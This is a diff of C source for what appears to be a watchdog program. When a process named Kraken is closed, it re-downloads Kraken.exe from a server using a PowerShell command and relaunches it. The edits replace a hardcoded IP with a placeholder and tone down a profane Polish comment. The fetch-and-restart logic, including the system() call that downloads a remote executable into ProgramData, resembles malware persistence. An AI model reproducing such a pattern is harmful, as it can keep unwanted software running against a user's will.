@@ -7,7 +7,7 @@
 #include "shlobj.h"
 #include <urlmon.h>
 
-#define KrakenURL "192.168.111.106/download/Kraken.exe"
+#define KrakenURL "[server_ip]/download/Kraken.exe"
 
 DWORD PrintProcessNameAndID(DWORD processID);
 int IsProcessRunning(DWORD pid);
@@ -55,7 +55,7 @@ int main()
             sleep(1);
             if (running == 0)
             {
-                //MessageBox(NULL,"   Kraken zostal zamkniety, teraz to siê kurwa pogniewamy!","Error, kurwa error",MB_OK|MB_ICONERROR);
+                //MessageBox(NULL,"Kraken zostal zamkniety, teraz to siê pogniewamy!","Error, error",MB_OK|MB_ICONERROR);
                 CallForKraken();
                 Sleep(1);
                 PID = FindKrakenProcess();
@@ -219,5 +219,5 @@ void TryDownloadKraken()
         return -1;
     }
     fclose(plik);
-    system("powershell -ExecutionPolicy RemoteSigned -File \"dwnd.ps1\" \"http://192.168.111.106/download/Kraken.exe\" \"C:\\ProgramData\\Kraken\\Kraken.exe\"");
+    system("powershell -ExecutionPolicy RemoteSigned -File \"dwnd.ps1\" \"http://[server_IP]/download/Kraken.exe\" \"C:\\ProgramData\\Kraken\\Kraken.exe\"");
 }
